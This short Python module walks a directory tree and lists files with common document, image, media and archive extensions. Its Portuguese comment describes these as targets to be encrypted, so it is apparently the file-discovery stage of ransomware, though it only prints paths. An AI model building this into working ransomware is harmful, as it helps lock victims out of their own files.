import os

def discover(initial_path):
	#extensões de possíveis arquivos alvos que serão encriptados
	extensions = [
		'jgp', 'jpeg', 'gif', 'doc', 'docx', 'pdf', 'txt',
		'png', 'mp3', 'mp4', 'xml', 'html', 'rtf', 'zip', 'tar',
		'tgz', 'rar', 'ppt', 'pptx',
	]
	
	for dirpath, dirs, files in os.walk(initial_path):
		for _file in files:
			abs_path = os.path.abspath(os.path.join(dirpath, _file))
			extension = abs_path.split('.')[-1]
			if extension in extensions:
				yield abs_path

#isso só é executado quando o módulo é executado diretamente
if __name__ == '__main__':
	x = discover(os.getcwd())
	for i in x:
		print(i)
